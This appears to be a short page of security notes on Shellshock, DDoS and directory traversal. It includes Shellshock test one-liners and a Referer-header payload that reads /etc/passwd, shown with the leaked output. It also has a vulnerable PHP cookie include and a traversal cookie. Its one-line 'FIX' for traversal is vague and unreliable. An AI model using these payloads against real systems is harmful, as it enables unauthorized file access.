Security
-

#### ~~Shellshock (bashdoor, CVE-2014-6271)~~

````sh
# CVE-2014-6271
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"

# CVE-2014-7169
env X='() { (a)=>\' bash -c "echo date"; cat echo

# CVE-2014-7186
bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' ||
echo "CVE-2014-7186 vulnerable, redir_stack"

# CVE-2014-7187
(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash ||
echo "CVE-2014-7187 vulnerable, word_lineno"
````

````sh
GET http://shellshock.testsparker.com/cgi-bin/netsparker.cgi HTTP/1.1
User-Agent: Netsparker
Host: shellshock.testsparker.com
Referer: () { :;}; echo "NS:" $(</etc/passwd)

HTTP/1.0 200 OK
Server: nginx/1.2.1
Date: Fri, 26 Sep 2014 11:22:43 GMT
Content-Type: text/html
NS: root:x:0:0:root:/root:/bin/bash
daemon: x:1:1:daemon:/usr/sbin:/bin/sh
bin: x:2:2:bin:/bin:/bin/sh
sys: x:3:3:sys:/dev:/bin/sh
sync: x:4:65534:sync:/bin:/bin/sync
games: x:5:60:games:/usr/games:/bin/sh
man: x:6:12:man:/var/cache/man:/bin/sh
lp: x:7:7:lp:/var/spool/lpd:/bin/sh
mail: x:8:8:mail:/var/mail:/bin/sh
news: x:9:9:news:/var/spool/news:/bin/sh
uucp: x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy: x:13:13:proxy:/bin:/bin/sh
www-data: x:33:33:www-data:/var/www:/bin/sh
backup: x:34:34:backup:/var/backups:/bin/sh
list: x:38:38:Mailing List Manager:/var/list:/bin/sh
irc: x:39:39:ircd:/var/run/ircd:/bin/sh
gnats: x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody: x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid: x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim: x:101:103::/var/spool/exim4:/bin/false
messagebus: x:102:106::/var/run/dbus:/bin/false
avahi: x:103:107:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
sshd: x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql: x:105:111:MySQL Server,,,:/nonexistent:/bin/false
Connection: close
````

#### DDos (Denial-of-service attack)

A distributed DDoS is a cyber-attack where the perpetrator uses more than one unique IP address,
often thousands of them.

Distributed autoscale systems may try to cope with DDoS.

#### Directory (path) traversal attack

AKA: ../ (dot dot slash) attack.
AIM: gain unauthorized access to the file system.

It is exploiting insufficient security validation / sanitization of user-supplied input file names.

````php
<?php
$template = 'red.php';
if (isset($_COOKIE['TEMPLATE']))
   $template = $_COOKIE['TEMPLATE'];
include ("/home/users/phpguru/templates/" . $template);
````
````
Cookie: TEMPLATE=../../../../../../../../../etc/passwd
````

FIX: Query string is usually URI decoded before use.
